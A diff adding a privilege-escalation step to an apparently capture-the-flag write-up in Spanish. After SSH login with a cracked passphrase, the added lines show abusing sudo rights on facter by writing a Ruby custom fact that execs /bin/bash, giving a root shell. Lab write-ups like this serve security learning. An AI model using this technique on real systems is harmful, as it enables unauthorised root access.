@@ -29,6 +29,14 @@ Esto nos dará el passphrase de trivia que es dragonballz
 
 Nos conectamos por ssh `ssh -i id_ed25519 trivia@10.129.2.38`
 
+ejecutamos `sudo -l` y vemos que podemos ejecutar como root `/usr/bin/facter` para ejecutarlo y explotarlo haremos lo siguiente
+```
+echo 'Facter.add(:x){setcode{exec "/bin/bash"}}' > /tmp/x.rb
+sudo facter --custom-dir=/tmp x
+```
+
+Y obtendremos la shell como root
+
 
 
 
